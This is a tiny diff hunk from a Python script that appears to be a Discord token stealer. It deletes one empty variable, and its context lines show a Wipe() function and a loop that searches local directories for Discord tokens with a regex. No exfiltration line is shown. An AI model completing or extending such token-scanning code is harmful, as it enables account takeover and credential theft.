@@ -94,7 +94,6 @@ def Wipe():
     else:
       pass
 
-realshit = ""
 
 ## Search Directorys for Token regex if exists
 for Discord, Directory in Directories.items():
